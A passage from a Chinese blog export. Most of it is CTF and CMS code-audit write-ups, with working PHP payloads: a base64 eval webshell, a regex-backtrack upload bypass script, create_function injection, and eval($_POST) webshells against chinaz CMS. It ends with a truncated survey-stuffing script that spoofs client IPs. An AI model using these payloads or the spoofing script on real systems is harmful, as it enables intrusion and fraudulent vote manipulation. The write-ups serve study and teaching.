ltltgtgtDiG994RedHat99474el762ltltgtgttAq，长度为41，所以需要先补充3个没用的aaa。这里还有一点需要注意的是，base64中的=只能出现在最末尾，而我们插入的字符串是在中间的，所以我们插入的字符串里不能有= 在线的base64中存在 ==，用php的base64_encode不存在 == payload: host:php ?domain=aaaPD9waHAgQGV2YWwoJF9HRVRbJzEyMyddKTs/Pg&amp;log=://filter/convert.base64-decode/resource=a3.php/. 但是又奇了个怪，怎么也写不进去。。。 file_put_contents()该函数将返回写入到文件内数据的字节数，失败时返回FALSE var_dump(file_put_contents())发现确实是false，权限也改成777了，我cao 又是之前遇到过的那个问题，突然想起来centos7需要 关闭SELINUX 1234&gt; vi /etc/selinux/config&gt; SELINUX=disabled #增加，别的都注释掉&gt; setenforce 0 #使配置立即生效&gt; 写入成功！！😀 一个文件只能写一次，如果文件已经存在也会写入失败 如果base64编码最后出现了==，可以舍去，因为本来也是用来补全的 参考链接：http://wonderkun.cc/index.html/?p=626#comments https://paper.seebug.org/755/#easy-phpmagic http://f1sh.site/2018/11/25/code-breaking-puzzles%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/","categories":[],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://yoursite.com/tags/代码审计/"},{"name":"codebreaking","slug":"codebreaking","permalink":"http://yoursite.com/tags/codebreaking/"}]},{"title":"未完成的seacms","slug":"未完成的seacms","date":"2019-08-14T04:02:41.000Z","updated":"2019-08-22T13:47:25.007Z","comments":true,"path":"2019/08/14/未完成的seacms/","link":"","permalink":"http://yoursite.com/2019/08/14/未完成的seacms/","excerpt":"昨天复现了chinaz中的3个命令执行漏洞，其中第3个虽然复现成功了，但是对payload还是不太懂，原理与海洋CMS类似，这里就来复现下海洋CMS 1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;","text":"function doDecrypt (pwd, onError) { console.log('in doDecrypt'); const txt = document.getElementById('enc_content').innerHTML; let plantext; try { const bytes = CryptoJS.AES.decrypt(txt, pwd); var plaintext = bytes.toString(CryptoJS.enc.Utf8); } catch(err) { if(onError) { onError(err); } return; } document.getElementById('enc_content').innerHTML = plaintext; document.getElementById('enc_content').style.display = 'block'; document.getElementById('enc_passwd').style.display = 'none'; if(typeof MathJax !== 'undefined') { MathJax.Hub.Queue( ['resetEquationNumbers', MathJax.InputJax.TeX], ['PreProcess', MathJax.Hub], ['Reprocess', MathJax.Hub] ); } } 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 var onError = function(error) { document.getElementById(\"enc_error\").innerHTML = \"password error!\" }; function decrypt() { var passwd = document.getElementById(\"enc_pwd_input\").value; console.log(passwd); doDecrypt(passwd, onError); }","categories":[],"tags":[{"name":"cms","slug":"cms","permalink":"http://yoursite.com/tags/cms/"}]},{"title":"codebreaking-2","slug":"codebreaking-2","date":"2019-08-14T04:01:05.000Z","updated":"2019-08-22T13:46:58.152Z","comments":true,"path":"2019/08/14/codebreaking-2/","link":"","permalink":"http://yoursite.com/2019/08/14/codebreaking-2/","excerpt":"第二题lei啦啦啦 1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;","text":"第二题lei啦啦啦 1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt; easy - pcrewaf1234567891011121314151617&lt;?php function is_php($data)&#123; return preg_match(&apos;/&lt;\\?.*[(`;?&gt;].*/is&apos;, $data); &#125; if(empty($_FILES)) &#123; die(show_source(__FILE__)); &#125; $user_dir = &apos;data/&apos; . md5($_SERVER[&apos;REMOTE_ADDR&apos;]); $data = file_get_contents($_FILES[&apos;file&apos;][&apos;tmp_name&apos;]); if (is_php($data)) &#123; echo &quot;bad request&quot;; &#125; else &#123; @mkdir($user_dir, 0755); $path = $user_dir . &apos;/&apos; . random_int(0, 10) . &apos;.php&apos;; move_uploaded_file($_FILES[&apos;file&apos;][&apos;tmp_name&apos;], $path); header(&quot;Location: $path&quot;, true, 303); &#125; 文件名不可控，文件内容可控 但是需要绕过 preg_match(‘/&lt;?.[(`;?&gt;]./is’, $data); 参考链接里面的 pcre.backtrack_limit 这个配置决定了在php中，正则引擎回溯的层数。而这个值默认是1000000. 举个例子 123正则：\\&lt;\\?.*[(`;?&gt;].*输入：&lt;?php phpinfo();//aaaaa 1234567891011121314匹配过程\\&lt; =&gt; &lt;\\? =&gt; ?.* =&gt; php phpinfo();//aaaaa [(`;?&gt;] =&gt; php phpinfo();//aaaa 开始回溯 1 [(`;?&gt;] =&gt; phpinfo();//aaa 21[(`;?&gt;] =&gt; phpinfo();//aa 3[(`;?&gt;] =&gt; phpinfo();//a 4[(`;?&gt;] =&gt; phpinfo();// 5[(`;?&gt;] =&gt; phpinfo();/ 6[(`;?&gt;] =&gt; phpinfo(); 7[(`;?&gt;] =&gt; phpinfo() 8[(`;?&gt;] =&gt; phpinfo();.* =&gt; phpinfo();//aaaaa 一共回溯了8次 可想而知，回溯的次数是有上限的，默认是100万，可以通过语句来查看 1234var_dump(ini_get(&apos;pcre.backtrack_limit&apos;));返回string(7) &quot;1000000&quot; 如果回溯次数超过了100万，查看 1234var_dump(preg_match(&apos;/&lt;\\?.*[(`;?&gt;].*/is&apos;, &apos;&lt;?php phpinfo();//.str_repeat(&apos;c&apos;,1000000)&apos;));返回bool(false) 所以，这道题的答案就呼之欲出了。我们通过发送超长字符串的方式，使正则执行失败，最后绕过目标对PHP语言的限制。 123456789import requestsfrom io import BytesIOfiles = &#123; &apos;file&apos;: BytesIO(b&apos;aaa&lt;?php phpinfo();//&apos; + b&apos;a&apos; * 1000000)&#125;res = requests.post(&apos;http://127.0.0.1/codebreaking/easy-pcrewaf/&apos;, files=files, allow_redirects=False)print(res.headers) 访问/data/f528764d624db129b32c21fbca0cb8d6即可，其中data/后面是md5(‘’) p神还提到了另一种更常见的waf 1234&lt;?phpif(preg_match(&apos;/UNION.+?SELECT/is&apos;, $input)) &#123; die(&apos;SQL Injection&apos;);&#125; 这里涉及到了正则表达式的“非贪婪模式”。具体参考p神的链接 回溯次数随着a的数量增加而增加。所以，我们仍然可以通过发送大量a，来使回溯次数超出pcre.backtrack_limit限制，进而绕过WAF 修复也很简单：用preg_match对字符串进行匹配，一定要使用===全等号来判断返回值， 参考链接：https://paper.seebug.org/755/ https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html https://regex101.com","categories":[],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://yoursite.com/tags/代码审计/"},{"name":"codebreaking","slug":"codebreaking","permalink":"http://yoursite.com/tags/codebreaking/"}]},{"title":"codebreaking-1","slug":"codebreaking-1","date":"2019-08-14T02:20:02.000Z","updated":"2019-08-22T13:47:04.004Z","comments":true,"path":"2019/08/14/codebreaking-1/","link":"","permalink":"http://yoursite.com/2019/08/14/codebreaking-1/","excerpt":"chrome+phpstorm的调试问题真是醉了，想起之前看到同学在刷code breaking，正好可以看看那个😀 1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;","text":"chrome+phpstorm的调试问题真是醉了，想起之前看到同学在刷code breaking，正好可以看看那个😀 1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt; easy - function12345678&lt;?php $action = $_GET[&apos;action&apos;] ?? &apos;&apos;; $arg = $_GET[&apos;arg&apos;] ?? &apos;&apos;; if(preg_match(&apos;/^[a-z0-9_]*$/isD&apos;, $action)) &#123; show_source(__FILE__); &#125; else &#123; $action(&apos;&apos;, $arg);&#125; $a ?? 0 等同于 isset($a) ? $a : 0 preg_match()返回 pattern 的匹配次数。 它的值将是0次（不匹配）或1次，因为preg_match()在第一次匹配后 将会停止搜索。要想办法绕过正则， ^ 匹配字符串开头，在多行模式中匹配每一行的开头$ 匹配字符串末尾，在多行模式中匹配每一行的末尾 模式分隔符后的”i”标记这是一个大小写不敏感的搜索 模式分隔符后的”s”标记模式中的点号元字符匹配所有字符, 包含换行符 模式分隔符后的”D”标记模式中的元字符美元符号仅仅匹配目标字符串的末尾. 正则很明显，就是要想办法在函数名的头或者尾找一个字符，不影响函数调用。 怎么找呢，fuzz大法好 当然fuzz也有技巧，有时候可以先自己写个脚本fuzz.php 这里不需要修改脚本，只需要在传值的时候在fuzz后加上一个正常的函数名，我用了var_dump，第一次用了echo会报错 (○´･д･)ﾉ 发现#是400错误，\\正常显示，原理可以参考给出的链接 然后是控制第二个参数来执行命令，可以使用create_function()来完成 函数结构 1234567create_function(&apos;$a,$b&apos;,&apos;return 111&apos;)==&gt; function a($a,$b)&#123; return 111;&#125; 我们想要执行任意代码，首先需要跳出函数定义 1234567create_function(&apos;$a,$b&apos;,&apos;return 111;&#125;phpinfo();//&apos;)==&gt;function a($a, $b)&#123; return 111;&#125;phpinfo();//&#125; 很奇怪的是直接执行下面的会报错，而且不能把//去掉 123function a($a, $b)&#123; return 111;&#125;phpinfo();//&#125; 所以最后的payload： ?action=\\create_function&amp;arg=}phpinfo();// ========================================================================== 然后联想到之前jactf遇到的变形题 12345678910111213141516&lt;?php if(isset($_GET[&apos;action&apos;])) &#123; $action = $_GET[&apos;action&apos;]; &#125; if(isset($_GET[&apos;action&apos;]))&#123; $arg = $_GET[&apos;arg&apos;]; &#125; if(preg_match(&apos;/^[a-z0-9_]*$/isD&apos;, $action))&#123; echo &quot;2&quot;; show_source(__FILE__); &#125; else &#123; $action($arg,&apos;&apos;); &#125; 直接构造payload： ?action=\\create_function&amp;arg=){}phpinfo();// 参考链接：https://paper.seebug.org/755/ phpstorm的调试问题真是醉了，想起之前看到同学在刷","categories":[],"tags":[{"name":"代码审计","slug":"代码审计","permalink":"http://yoursite.com/tags/代码审计/"},{"name":"codebreaking","slug":"codebreaking","permalink":"http://yoursite.com/tags/codebreaking/"}]},{"title":"chinaz的代码执行和命令执行漏洞","slug":"chinaz的代码执行和命令执行漏洞","date":"2019-08-13T04:57:44.000Z","updated":"2019-08-22T13:47:10.099Z","comments":true,"path":"2019/08/13/chinaz的代码执行和命令执行漏洞/","link":"","permalink":"http://yoursite.com/2019/08/13/chinaz的代码执行和命令执行漏洞/","excerpt":"Xman回来的第2天，把刘哥发的北京营的ppt看了下，复现了chinaz的三个命令执行漏洞，以前都是盲目刷题，题目质量层次不齐，对很多原理也是一知半解，在Xman的时候和张力大佬聊了许多，以后要多复现CMS。 1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;","text":"Xman回来的第2天，把刘哥发的北京营的ppt看了下，复现了chinaz的三个命令执行漏洞，以前都是盲目刷题，题目质量层次不齐，对很多原理也是一知半解，在Xman的时候和张力大佬聊了许多，以后要多复现CMS。 1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt; 1、index.php1234567891011121314&lt;?php require_once(&quot;library/common.php&quot;); require_once(&quot;library/view.php&quot;); $view_class = new View(); $data = array(); if (isset($_GET[&apos;page&apos;])) &#123; $data[&apos;page&apos;] = filter($_GET[&apos;page&apos;]); &#125; else&#123; $data[&apos;page&apos;] = &apos;js&apos;; &#125; $view_class-&gt;echoContent($data[&apos;page&apos;], $data);?&gt; index页面通过page参数调用不同功能的php页面 2、action.php12345678910&lt;?php require_once(&quot;library/common.php&quot;); require_once(&quot;library/view.php&quot;); $page = filter($_POST[&apos;page&apos;]).&apos;.php&apos;; $post_data = array(); foreach ($_POST as $key =&gt; $value) &#123; $post_data[$key] = $value; &#125; @require_once($page);?&gt; 存在文件包含，但是存在后缀.php，过滤主要是filter， 全局搜索 12345&gt; function filter($input)&gt; &#123;&gt; return str_replace(&apos;.&apos;, &apos;&apos;, $input);&gt; &#125;&gt; 将 . 过滤成空，文件包含路径中不能有 . 导致无法使用相对路径 那么我们可以使用绝对路径进行包含。 可以包含常见重要文件或日志文件 3、common.php12345function write_log($input)&#123; global $cfg_logfile; file_put_contents($cfg_logfile, $input, FILE_APPEND);&#125; 123456789101112function loadFile($filePath)&#123; global $cfg_basedir; if(!file_exists($filePath))&#123; write_log(&apos;Try to open Null file:&apos;.$filePath); return file_get_contents($cfg_basedir.&apos;/error.php&apos;); &#125; $fp = @fopen($filePath,&apos;r&apos;); $sourceString = @fread($fp,filesize($filePath)); @fclose($fp); return $sourceString;&#125; 1$cfg_logfile = dirname($_SERVER[&apos;SCRIPT_FILENAME&apos;]) . DS. &quot;logs/logfile.php&quot;; 当访问不存在的页面时，写入内容到logs/logfile.php中 4、漏洞一攻击复现构造payload： http://59.110.164.44:8238/?page=%3Cphp%20phpinfo();?%3E 访问： http://59.110.164.44:8238/logs/logfile.php 如果没有直接访问权限，也可以使用action.php中的文件包含， 并且可以看到phpinfo中，因此无法远程文件包含 allow_url_fopen On On allow_url_include Off Off 5、normaliz.php12345678910try&#123; if ($method == &apos;/\\\\d+\\\\.\\\\d+\\\\.\\\\d+\\\\.\\\\d+/&apos;) &#123; $res = preg_replace($method, $ip_replacement, $source); &#125; else &#123; $res = preg_replace($method, $mail_replacement, $source); &#125; &#125; preg_replace的正则如果加了e这个选项，会把正则表达式替换的部分替换之后的内容执行一下，然后将执行完的结果放入需要被替换的位置 method=/a/e&amp;mail_replacement=phpinfo()&amp;source=a; preg_replace(“/a/e”,”phpinfo()”,”a”); 但是php 7.0.0开始，不再支持/e修饰符，请用preg_replace_callback()代替 而且从前面的phpinfo得知我们的PHP版本是7.3.4🤦‍ 6、先解决变量覆盖问题1234567$view_class = new View();$data = array();$data[&apos;page&apos;] = &apos;normaliz&apos;;$ip_replacement = &apos;222.222.222.222&apos;;$mail_replacement = &apos;lollol@lol.com&apos;;$data[&apos;res&apos;] = action($post_data, $ip_replacement, $mail_replacement);$view_class-&gt;echoContent($data[&apos;page&apos;], $data); 除了$post_data，其他值都是写死的，如何控制 通过action.php的文件包含，进行变量覆盖控制 1234$post_data = array();foreach ($_POST as $key =&gt; $value) &#123; $post_data[$key] = $value;&#125; + normaliz.php 1234function action($post_data, $ip_replacement, $mail_replacement)&#123; foreach ($post_data as $key =&gt; $value) &#123; $$key = $value; &#125; 7、漏洞二攻击复现在本地将php切换为php5.4构造payload: http://127.0.0.1/chinaz/ post： page=normaliz&amp;method=/a/e&amp;mail_replacement=phpinfo()&amp;source=a 8、view.php1@eval(&quot;if(&quot;.$strIf.&quot;)&#123;\\$ifstatus=true;&#125;else&#123;\\$ifstatus=false;&#125;&quot;); 和典型的海洋cms漏洞差不多 1234&lt;?php $strIf=&apos;&quot;&quot;or phpinfo() or&quot;&quot;==&quot;&quot;&apos;; var_dump(&quot;if(&quot;.$strIf.&quot;)&#123;\\$ifstatus=true;&#125;else&#123;\\$ifstatus=false;&#125;&quot;); var_dump(@eval(&quot;if(&quot;.$strIf.&quot;)&#123;\\$ifstatus=true;&#125;else&#123;\\$ifstatus=false;&#125;&quot;)); 结果： 1234567string(66) &quot;if(&quot;&quot;or phpinfo() or&quot;&quot;==&quot;&quot;)&#123;$ifstatus=true;&#125;else&#123;$ifstatus=false;&#125;&quot;phpinfo()PHP Version =&gt; 7.3.4System =&gt; Windows NT DESKTOP-58QQPVV 10.0 build 17134 (Windows 10) AMD64............ 9、寻找攻击点123456789101112131415161718192021&lt;?php require_once(&quot;library/common.php&quot;); require_once(&quot;library/view.php&quot;); function action($post_data)&#123; foreach ($post_data as $key =&gt; $value) &#123; $$key = $value; &#125; if ($method===&apos;md5&apos;)&#123; $res = md5($source); &#125; if ($method===&apos;sha1&apos;)&#123; $res = sha1($source); &#125; return $res; &#125; $view_class = new View(); $data = array(); $data[&apos;page&apos;] = &apos;md5&apos;; $data[&apos;res&apos;] = action($post_data); $view_class-&gt;echoContent($data[&apos;page&apos;], $data);?&gt; md5文件包含了view.php，且有变量覆盖点，res可控制$strif 话是这么说，但是看了半天也看不懂res是怎么控制$strIf的，太多处理函数，最讨厌的一点是我每次firefox+burp+phpstorm调试一会就会断掉。。。不知道为啥😭 10、漏洞三复现构造payload： http://127.0.0.1/chinaz/action.php post：page=md5&amp;res=”or @eval($_POST[adddd]) or “&amp;adddd=phpinfo(); 这里的post的值需要bp抓包修改，因为hackbar直接传值res会变成”” 跟着pdf里面的流程走了一遍，除了第三个具体细节不是很懂，等下次复现海洋CMS的时候再回头看看把，还有希望有人帮我解决我的调试问题。","categories":[],"tags":[{"name":"cms","slug":"cms","permalink":"http://yoursite.com/tags/cms/"},{"name":"命令执行与代码执行","slug":"命令执行与代码执行","permalink":"http://yoursite.com/tags/命令执行与代码执行/"}]},{"title":"爬虫入门","slug":"爬虫入门","date":"2019-07-25T05:20:39.000Z","updated":"2019-08-22T13:47:31.156Z","comments":true,"path":"2019/07/25/爬虫入门/","link":"","permalink":"http://yoursite.com/2019/07/25/爬虫入门/","excerpt":"在软件创新实验室暑期集训的时候，叶同学讲了爬虫，这里简单把两种爬虫应用记录下。还有，我第一次接触爬虫是通过张宏伦的《全栈数据工程师》，感兴趣的可以去看看 1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;","text":"在软件创新实验室暑期集训的时候，叶同学讲了爬虫，这里简单把两种爬虫应用记录下。还有，我第一次接触爬虫是通过张宏伦的《全栈数据工程师》，感兴趣的可以去看看 1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt; 1、爬取某网站的招聘信息1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677import requestsimport reimport timeimport jsonimport csvfrom bs4 import BeautifulSoupheaders = &#123; &apos;User-Agent&apos;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36&quot;&#125;s = requests.session()f = open(&quot;data.json&quot;, &quot;a&quot;, encoding=&apos;utf-8&apos;)def get_one_page(url): try: r = requests.get(url, headers=headers) r.encoding = r.apparent_encoding return r.text except: return &quot;爬取失败&quot;import pandas as pddef parse_page3(res): html = BeautifulSoup(res, &quot;html.parser&quot;) # print(res) result = [] place = html.select(&quot;#list_con &gt; li &gt; div.item_con.job_title &gt; div.job_name.clearfix &gt; a &gt; span.address&quot;) job = html.select(&apos;#list_con &gt; li &gt; div.item_con.job_title &gt; div.job_name.clearfix &gt; a &gt; span.name&apos;) salary = html.select(&apos;#list_con &gt; li &gt; div.item_con.job_title &gt; p&apos;) company = html.select(&apos;#list_con &gt; li &gt; div.item_con.job_comp &gt; div &gt; a&apos;) welfare = html.select(&apos;#list_con &gt; li &gt; div.item_con.job_title &gt; div.job_wel.clearfix&apos;) for place, job, salary, company, welfare in zip(place, job, salary, company, welfare): result.append(&#123; &quot;place&quot;: place.get_text(), &quot;job&quot;: job.get_text(), &quot;salary&quot;: salary.get_text(), &quot;company&quot;: company.get_text(), &quot;welfare&quot;: welfare.get_text() &#125;) # 储存为json文件 f.write(json.dumps(result, indent=2, ensure_ascii=False)) # 储存为csv文件(pandas) df = pd.DataFrame(result) df.to_csv(&apos;data2.csv&apos;, index=False, sep=&apos;,&apos;, mode=&apos;a&apos;) # 储存为excel文件 df = pd.DataFrame(result) df.to_csv(&apos;data3.xls&apos;, index=False, sep=&apos; &apos;, mode=&apos;a&apos;, encoding=&apos;utf-8_sig&apos;) return resultdef main(offset): url = &quot;https://hz.58.com/ywtzjingli/pn&quot; + str( offset) + &quot;/?classpolicy=main_null,job_A&amp;final=1&amp;jump=1&amp;PGTID=0d35f8c7-0004-f4fa-d607-70e9d941aa91&amp;ClickID=2&quot; html = get_one_page(url) result = parse_page3(html) # print(result) # tmp1 = [] # for dic in result: # print(dic) # tmp = [] # tmp.append(dic[&apos;place&apos;]) # tmp.append(dic[&apos;job&apos;]) # tmp.append(dic[&apos;salary&apos;]) # tmp.append(dic[&apos;company&apos;]) # tmp.append(dic[&apos;welfare&apos;]) # print(tmp) # tmp1.append(tmp)if __name__ == &apos;__main__&apos;: for i in range(1, 4): main(i) time.sleep(1) 2、自动填写问卷123456789101112131415161718192021222324252627282930313233import timefrom random import randintimport requestsurl = &quot;https://www.wjx.cn/joinnew/processjq.ashx?submittype=1&amp;curID=43819938&amp;t=1565166732242&amp;starttime=2019%2F8%2F7%2016%3A32%3A09&amp;ktimes=26&amp;rn=606189091.36417905&amp;hlv=1&amp;jqnonce=b636e088-5337-4ff5-973b-4ac2fd8b59ee&amp;jqsign=d050c6%3E%3E%2B3551%2B2%60%603%2B%3F15d%2B2ge4%60b%3Ed3%3Fcc&amp;jpm=17&quot;for i in range(1,10): header = &#123; &apos;Host&apos;:&apos;www.wjx.cn&apos;, &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0&apos;, &apos;Accept&apos;: &apos;* / *&apos;, &apos;Accept - Language&apos;:&apos;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&apos;, &apos;Accept - Encoding&apos;: &apos;gzip, deflate&apos;, &apos;Content-Type&apos;: &apos;application/x-www-form-urlencoded&apos;, &apos;Referer&apos;: &apos;https://www.wjx.cn/jq/43819938.aspx&apos;, &apos;Content-Length&apos;: &apos;32&apos;, &apos;x-forwarded-for&apos;:str(randint(1,255))+&apos;,&apos;+str(randint(1,255))+&apos;,&apos;+str(randint(1,255))+&apos;,&apos;+str(randint(1,255)), &apos;Cookie&apos;: &apos;acw_tc=2f624a2a15651667032113449e5a5a78c559be33a29f05393240f389ae1f26; 